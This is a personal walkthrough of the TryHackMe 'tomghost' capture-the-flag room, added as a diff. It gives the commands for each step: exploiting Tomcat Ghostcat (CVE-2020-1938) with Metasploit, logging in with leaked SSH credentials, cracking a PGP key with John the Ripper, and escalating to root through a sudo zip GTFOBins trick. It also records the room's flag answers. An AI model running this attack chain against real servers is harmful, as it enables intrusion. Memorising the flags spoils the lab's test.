@@ -1,0 +1,82 @@
+https://tryhackme.com/room/tomghost
+
+Machine IP: 10.145.151.211
+Attack Machine: Kali VM on host machine with OpenVPN profile
+
+# commands
+## comments
+------------------------------------------------------------------------------------------------
+Q: Compromise this machine and obtain user.txt
+A: THM{GhostCat_1s_so_cr4sy}
+
+# nmap -A -T5 10.145.151.211
+
+## 8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+## | ajp-methods: 
+## |_  Supported methods: GET HEAD POST OPTIONS
+## 8080/tcp open  http       Apache Tomcat 9.0.30
+## |_http-favicon: Apache Tomcat
+## |_http-title: Apache Tomcat/9.0.30
+
+## So there is a CVE for AJP for Tomcat that affects this version (inclusive)
+## CVE: https://nvd.nist.gov/vuln/detail/cve-2020-1938
+## Exploit-DB: https://www.exploit-db.com/exploits/49039
+
+# msfconsole
+# search ghostcat
+##    #  Full Name                             Disclosure Date  Rank    Check  Name
+	  -  ---------                             ---------------  ----    -----  ----
+      0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read
+# use 0
+# set rhosts 10.145.151.211
+# exploit
+
+##  <description>
+##     Welcome to GhostCat
+##        skyfuck:8730281lkjlkjdqlksalks
+##  </description>
+
+## So we've got a username and password here, let's ssh in
+
+# ssh skyfuck@10.145.151.211
+# yes
+# 8730281lkjlkjdqlksalks
+
+# ls /home
+## We found another user, let's cd there and ls that file
+
+# cd /home/merlin
+# cat user.txt
+
+Q: Escalate privileges and obtain root.txt
+A: THM{Z1P_1S_FAKE}
+
+## If you ls inside the home directory of skyfuck, you see a PGP file tryhackme.asc, copy those contents into a file named crackpgp on local terminal
+
+# gpg2john crackpgp > crackitnow.txt
+# john --wordlist=/usr/share/wordlists/rockyou.txt crackitnow.txt
+
+## alexandru        (tryhackme)
+
+## back on the machine as skyfuck:
+# gpg --decrypt credential.pgp
+
+## I got an error when running the above because the secret key wasn't imported, so I did the following:
+# gpg --list-secret-key
+# gpg --import tryhackme.asc
+
+# gpg --decrypt credential.pgp
+# alexandru
+
+## merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+# ssh merlin@10.145.151.211
+# asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+# sudo -l
+##   User merlin may run the following commands on ubuntu:
+##      (root : root) NOPASSWD: /usr/bin/zip
+
+## GTFObins for zip: https://gtfobins.org/gtfobins/zip/
+# sudo zip temp /etc/hosts -T -TT '/bin/bash #'
+# cat /root/root.txt
